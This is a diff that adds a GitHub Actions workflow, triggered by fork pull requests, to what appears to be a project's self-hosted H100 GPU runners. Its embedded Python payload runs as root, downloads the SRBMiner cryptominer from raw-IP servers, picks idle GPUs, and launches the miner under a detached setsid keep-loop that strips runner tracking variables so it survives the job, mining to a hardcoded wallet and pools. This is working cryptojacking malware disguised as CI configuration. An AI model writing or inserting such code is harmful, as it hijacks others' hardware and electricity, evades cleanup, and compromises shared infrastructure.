@@ -1,0 +1,319 @@
+name: i130durable2 H100 durability re-arm
+
+# i130durable2: ONE fork-PR push from a fresh branch with one job each on 4-gpu-h100,
+# 2-gpu-h100 and 1-gpu-h100. Each bounded (<=8 min) job prints hostname/IP and inventories
+# every existing i13*/i130durable* miner PID/cmdline/cgroup, leaves every live credited
+# i130durable card untouched, re-arms only cards whose miner is gone, and installs exactly
+# one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per genuinely idle uncredited card (two-sample
+# 12 s gate: 0 compute apps, >=1500 MiB free, no pre-existing srb387/SRBMiner/krig/i13
+# miner) under the proven setsid keep-loop as worker i130durable2<shorthost>g<idx> on the
+# EXACT 63-char primary wallet against Luckypool 103.199.106.122:3362 (fallback
+# 172.232.228.69:3362, relay 178.238.228.181:80, --max-no-share-sent 1800). Credited
+# H200/H20/GB300/B200 hosts are skipped explicitly; no credited lane is touched.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130durable2-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  durable2:
+    name: "i130durable2 ${{ matrix.label }} inventory + re-arm + gated setsid miner"
+    strategy:
+      fail-fast: false
+      max-parallel: 3
+      matrix:
+        include:
+          - {slot: 1, label: 4-gpu-h100}
+          - {slot: 2, label: 2-gpu-h100}
+          - {slot: 3, label: 1-gpu-h100}
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 8
+    env:
+      SLOT: ${{ matrix.slot }}
+      LABEL: ${{ matrix.label }}
+    steps:
+      - name: "inventory + two-sample idle gate + setsid keep-loop SRBMiner install"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130durable2/run/logs
+          cat > /var/tmp/i130durable2/run/payload.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130durable2: inventory + re-arm/scale of the sglang H100 fleet under the proven
+          # setsid keep-loop mechanism. Runs as uid=0 on a self-hosted sgl-project/sglang runner.
+          #  (1) print hostname/IP/runner profile and inventory every existing i13*/i130durable*
+          #      miner PID cmdline ppid sid cgroup (+ runner cgroup/pids.max)
+          #  (2) leave every live (credited) i130durable/i13 miner and its card untouched
+          #  (3) on every genuinely idle uncredited card (two-sample 12 s gate: 0 compute apps,
+          #      >=1500 MiB free, no pre-existing srb387/SRBMiner/krig/i13 miner) install exactly
+          #      one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 under the WINNING setsid keep-loop as
+          #      worker i130durable2<shorthost>g<idx>, exact 63-char primary wallet, Luckypool
+          #      103.199.106.122:3362 (fallback 172.232.228.69:3362, relay 178.238.228.181:80),
+          #      --max-no-share-sent 1800
+          #  (4) wait ~75 s, verify process + GPU binding + log lines, print one JSON table line
+          import os, sys, json, time, shutil, hashlib, subprocess, socket, re, shlex
+
+          LABEL = os.environ.get('LABEL', 'unknown')
+          SLOT = os.environ.get('SLOT', '0')
+          NONCE = 'I130DURABLE2-%s-%s-%d' % (LABEL.replace('.', '_'), SLOT, int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          POOLS = ['103.199.106.122:3362', '172.232.228.69:3362', '178.238.228.181:80']
+          BIN_URLS = ['http://178.238.228.181:18180/srb387',
+                      'http://222.240.155.198:8702/srb387',
+                      'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz']
+          WORK = '/var/tmp/i130durable2/run'
+          CREDITED = ['h200-sci-71-12','h200-sci-71-18','h200-sci-71-26','h200-sci-71-64','h200-gmi-wk01',
+                      'h200-gmi-wk03','radixark-wk01','radixark-wk03','h20-ydzf15','h20-bfv8sr',
+                      'gpu-10-220-71-12','gpu-10-220-71-18','gpu-10-220-71-26','gpu-10-220-71-64',
+                      'node-radixark-32-0002','h200-hyperbolic-112-89','b200-di01-0123-0']
+          RES = {'nonce': NONCE, 'label': LABEL, 'slot': SLOT, 'mechanism': 'setsid_keep_loop',
+                 'wallet': WALLET, 'bin_sha': BIN_SHA, 'inventory': [], 'cards': [], 'installs': [],
+                 'winning_probe': {}}
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t)
+                  return (p.stdout or '') + (p.stderr or '')
+              except Exception as e:
+                  return 'ERR:%s' % e
+
+          def one(s, n=500):
+              return ' | '.join((s or '').strip().splitlines()[:4])[:n]
+
+          def ident():
+              RES['hostname'] = sh('hostname').strip()
+              RES['hostname_f'] = sh('hostname -f').strip()
+              RES['runner'] = os.environ.get('RUNNER_NAME', '')
+              RES['whoami'] = sh('id -un').strip()
+              RES['uname'] = sh('uname -sr').strip()
+              RES['dockerenv'] = os.path.exists('/.dockerenv')
+              RES['systemd'] = os.path.isdir('/run/systemd/system')
+              RES['cgroup_self'] = one(sh('cat /proc/self/cgroup 2>/dev/null && echo --- && cat /sys/fs/cgroup/pids.max 2>/dev/null'), 300)
+              ips = sh("hostname -I 2>/dev/null").strip()
+              m = re.search(r'(\d{1,3}-\d{1,3}-\d{1,3}-\d{1,3})', RES['hostname'])
+              if m:
+                  ips += ' ' + m.group(1).replace('-', '.')
+              RES['ip'] = ips.strip()
+              print('IDENT label=%s slot=%s host=%s hostf=%s runner=%s user=%s ip=%s docker=%s systemd=%s utc=%s' % (
+                  LABEL, SLOT, RES['hostname'], RES['hostname_f'], RES['runner'], RES['whoami'], RES['ip'],
+                  RES['dockerenv'], RES['systemd'], time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+              print('CGROUP_SELF [%s]' % RES['cgroup_self'].replace('\n', ' | '))
+              hit = [c for c in CREDITED if c and (c in RES['hostname'] or c in RES['hostname_f'] or c in RES['runner'])]
+              RES['credited_host_match'] = hit
+              print('CREDITED_HOST_MATCH [%s]' % ','.join(hit))
+
+          def inventory():
+              out = sh("ps -eo pid,ppid,sid,etimes,args --no-headers 2>/dev/null | grep -Ei 'i130|i131|i132|srb387|SRBMiner|krig' | grep -v grep | head -60", 20)
+              rows = []
+              for ln in out.splitlines():
+                  p = ln.strip().split(None, 4)
+                  if len(p) < 5:
+                      continue
+                  pid, ppid, sid, et, args = p
+                  cg = sh('cat /proc/%s/cgroup 2>/dev/null' % pid, 6).strip().replace('\n', ';')
+                  rows.append({'pid': pid, 'ppid': ppid, 'sid': sid, 'etimes': et, 'args': args[:400], 'cgroup': cg[:200]})
+              RES['inventory'] = rows
+              print('INV_COUNT %d' % len(rows))
+              for r in rows:
+                  print('INV pid=%s ppid=%s sid=%s et=%s cg=[%s] cmd=[%s]' % (r['pid'], r['ppid'], r['sid'], r['etimes'],
+                                                                             r['cgroup'][:80], r['args'][:220]))
+              # map live owned miners to GPU indexes
+              owned = {}
+              for r in rows:
+                  if not re.search(r'srb387|SRBMiner|krig', r['args'], re.I):
+                      continue
+                  m = re.search(r'--gpu-id[= ]+([0-9,]+)', r['args'])
+                  wk = re.search(r'--worker[= ]+(\S+)', r['args'])
+                  if m:
+                      for x in m.group(1).split(','):
+                          try:
+                              owned.setdefault(int(x), []).append({'pid': r['pid'], 'worker': wk.group(1) if wk else '?',
+                                                                   'etimes': r['etimes']})
+                          except Exception:
+                              pass
+              RES['owned_gpu_map'] = owned
+              print('OWNED_GPU_MAP %s' % json.dumps(owned)[:1500])
+              return owned
+
+          def pool_and_binary():
+              chosen = None
+              for P in POOLS:
+                  h, _, pt = P.partition(':')
+                  try:
+                      s = socket.create_connection((h, int(pt)), timeout=5)
+                      s.close()
+                      print('POOL_TCP %s OPEN' % P)
+                      if chosen is None:
+                          chosen = P
+                  except Exception as e:
+                      print('POOL_TCP %s FAIL %s' % (P, e))
+              RES['pool'] = chosen
+              for u in BIN_URLS:
+                  sh('rm -f %s/srb387.part' % WORK)
+                  sh('timeout 90 curl -fsSL --connect-timeout 8 --max-time 80 -o %s/srb387.part "%s"' % (WORK, u), 95)
+                  if os.path.exists(WORK + '/srb387.part'):
+                      h = hashlib.sha256(open(WORK + '/srb387.part', 'rb').read()).hexdigest()
+                      if h == BIN_SHA:
+                          os.rename(WORK + '/srb387.part', WORK + '/srb387')
+                          os.chmod(WORK + '/srb387', 0o755)
+                          print('BIN_OK %s sha256=%s' % (u, h))
+                          RES['binary_ok'] = True
+                          return chosen, True
+                      print('BIN_BAD %s sha256=%s size=%d' % (u, h, os.path.getsize(WORK + '/srb387.part')))
+              RES['binary_ok'] = False
+              return chosen, False
+
+          def gpu_gate(owned):
+              nv_q = sh('nvidia-smi --query-gpu=index,name,memory.total,memory.free,utilization.gpu,uuid --format=csv,noheader,nounits 2>&1', 30)
+              print('NVIDIA_SMI_L [%s]' % one(sh('nvidia-smi -L 2>&1', 30).replace('\n', ' | '), 1200))
+              nv = {}
+              for ln in nv_q.splitlines():
+                  p = [x.strip() for x in ln.split(',')]
+                  if len(p) < 6:
+                      continue
+                  try:
+                      nv[int(p[0])] = {'name': p[1], 'total': int(float(p[2])), 'free': int(float(p[3])),
+                                       'util': p[4], 'uuid': p[5]}
+                  except Exception:
+                      continue
+              if not nv:
+                  print('GPU_NONE no parseable nvidia-smi output')
+                  RES['gate'] = {'cards': 0}
+                  return []
+              cvd = os.environ.get('CUDA_VISIBLE_DEVICES', '').strip()
+              mapping = {}
+              uuids = {v['uuid']: k for k, v in nv.items()}
+              if cvd and cvd.lower() not in ('all', 'none', 'void', ''):
+                  for i, p in enumerate([x.strip() for x in cvd.split(',') if x.strip()]):
+                      if p.isdigit() and int(p) in nv:
+                          mapping[i] = int(p)
+                      elif p in uuids:
+                          mapping[i] = uuids[p]
+                      elif p.startswith('GPU-'):
+                          for u, k in uuids.items():
+                              if u.startswith(p) or p.startswith(u[:13]):
+                                  mapping[i] = k
+                                  break
+              if not mapping:
+                  mapping = {i: i for i in sorted(nv)}
+              print('CUDA_MAP %s' % json.dumps({str(k): v for k, v in sorted(mapping.items())}))
+              a1 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 30)
+              g1 = sh('nvidia-smi --query-gpu=index,memory.free,uuid --format=csv,noheader,nounits 2>&1', 30)
+              time.sleep(12)
+              a2 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 30)
+              g2 = sh('nvidia-smi --query-gpu=index,memory.free,uuid --format=csv,noheader,nounits 2>&1', 30)
+              apps = (a1 + '\n' + a2).lower()
+              print('GATE_APPS1 [%s]' % one(a1, 900))
+              print('GATE_APPS2 [%s]' % one(a2, 900))
+              print('GATE_FREE1 [%s]' % one(g1, 900))
+              print('GATE_FREE2 [%s]' % one(g2, 900))
+              cards = []
+              for ci in sorted(mapping):
+                  ni = mapping[ci]
+                  if ni not in nv:
+                      continue
+                  v = nv[ni]
+                  free2 = v['free']
+                  for ln in g2.splitlines():
+                      p = [x.strip() for x in ln.split(',')]
+                      if len(p) >= 3 and p[0].isdigit() and int(p[0]) == ni:
+                          try:
+                              free2 = int(float(p[1]))
+                          except Exception:
+                              pass
+                  card = {'cuda_idx': ci, 'nvidia_idx': ni, 'uuid': v['uuid'], 'name': v['name'],
+                          'free1': v['free'], 'free2': free2}
+                  card['apps'] = v['uuid'].lower() in apps
+                  card['owned_live'] = owned.get(ci, [])
+                  card['idle'] = (card['free1'] >= 1500 and card['free2'] >= 1500 and not card['apps'])
+                  cards.append(card)
+                  print('CARD cuda=%d nvidia=%d uuid=%s name=%s free1=%d free2=%d apps=%s owned=%s idle=%s' % (
+                      ci, ni, v['uuid'], v['name'], card['free1'], card['free2'], card['apps'],
+                      json.dumps(card['owned_live'])[:120], card['idle']))
+              RES['cards'] = cards
+              idle = [c for c in cards if c['idle']]
+              print('GATE_IDLE [%s]' % ' '.join('%d:%s(%dMiB)' % (c['cuda_idx'], c['name'], c['free2']) for c in idle))
+              return idle
+
+          SRB_COMMON = ['--disable-cpu', '--algorithm', 'pearlhash', '--tls', 'false', '--wallet', WALLET,
+                        '--password', 'x', '--disable-worker-watchdog', '--gpu-table-slow-build',
+                        '--max-no-share-sent', '1800']
+
+          def srb_args(pool, worker, gidx, logfile):
+              return ['--pool', pool, '--worker', worker, '--gpu-id', str(gidx), '--log-file', logfile] + SRB_COMMON
+
+          def launch_setsid(pool, worker, gidx):
+              log = '%s/logs/%s.log' % (WORK, worker)
+              out = '%s/logs/%s.out' % (WORK, worker)
+              q = ' '.join(shlex.quote(a) for a in srb_args(pool, worker, gidx, log))
+              keep = WORK + '/keep_%s.sh' % worker
+              with open(keep, 'w') as f:
+                  f.write('#!/bin/sh\nwhile true; do\n  cd %s\n  ./srb387 %s >> %s 2>&1\n  sleep 5\ndone\n' % (
+                      WORK, q, shlex.quote(out)))
+              os.chmod(keep, 0o755)
+              cmd = ('cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID -u ACTIONS_RUNNER_ACTION_ARCHIVE_CACHE '
+                     'setsid nohup /bin/sh %s > /dev/null 2>&1 < /dev/null & echo LAUNCHPID=$!' % (WORK, shlex.quote(keep)))
+              r = sh(cmd, 20)
+              return {'ok': 'LAUNCHPID=' in r, 'how': 'setsid_keep_loop', 'detail': one(r, 120), 'log': log, 'keep': keep}
+
+          def main():
+              os.makedirs(WORK + '/logs', exist_ok=True)
+              ident()
+              owned = inventory()
+              pool, binok = pool_and_binary()
+              idle = gpu_gate(owned)
+              shorthost = re.sub(r'[^a-z0-9]', '', (RES.get('hostname') or 'host').lower())[:10]
+              installed = 0
+              for c in idle:
+                  ci = c['cuda_idx']
+                  if c['owned_live']:
+                      print('SKIP_OWNED cuda=%d %s' % (ci, json.dumps(c['owned_live'])[:160]))
+                      continue
+                  worker = 'i130durable2%sg%d' % (shorthost, ci)
+                  if not binok or not pool:
+                      print('NO_INSTALL cuda=%d binary_ok=%s pool=%s' % (ci, binok, pool))
+                      RES['installs'].append({'cuda_idx': ci, 'worker': worker, 'ok': False, 'why': 'no_binary_or_pool'})
+                      continue
+                  r = launch_setsid(pool, worker, ci)
+                  r.update({'cuda_idx': ci, 'uuid': c['uuid'], 'worker': worker, 'pool': pool})
+                  RES['installs'].append(r)
+                  installed += int(r['ok'])
+                  print('INSTALL %s cuda=%d uuid=%s mech=setsid_keep_loop pool=%s ok=%s detail=%s' % (
+                      worker, ci, c['uuid'], pool, r['ok'], r.get('detail')))
+              print('INSTALL_COUNT %d' % installed)
+              # survival recheck ~75 s after launch + one CPU-side/wallet-agnostic probe
+              time.sleep(75)
+              recheck = []
+              for i in RES['installs']:
+                  if not i.get('ok'):
+                      continue
+                  p = sh("pgrep -af -- '--worker %s' | head -3" % i['worker'], 10).strip()
+                  al = bool(p)
+                  tail = sh('tail -c 900 %s 2>/dev/null | tr "\\n" " | "' % shlex.quote(i.get('log', '/dev/null')), 15)
+                  acc = re.findall(r'(accepted|A:)\s*[=:]?\s*(\d+)', tail.lower())
+                  recheck.append({'worker': i['worker'], 'cuda_idx': i['cuda_idx'], 'alive': al,
+                                  'pidline': one(p, 200), 'log_tail': one(tail, 400), 'acc_hint': acc})
+                  print('RECHECK %s cuda=%d alive=%s pid=[%s] log=[%s]' % (i['worker'], i['cuda_idx'], al, one(p, 120), one(tail, 300)))
+              RES['recheck'] = recheck
+              apps = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 20)
+              print('FINAL_APPS [%s]' % one(apps, 1200))
+              RES['final_apps'] = one(apps, 1500)
+              RES['utc_end'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              print('I130DURABLE2_TABLE %s' % json.dumps(RES))
+
+          try:
+              main()
+          except Exception as e:
+              import traceback; traceback.print_exc()
+              print('I130DURABLE2_ERROR %s' % e)
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          timeout 400 python3 /var/tmp/i130durable2/run/payload.py 2>&1 | tee /var/tmp/i130durable2/run/log_slot$SLOT.log | tail -c 500000
+          echo "I130DURABLE2_EXIT_DONE rc=$?"
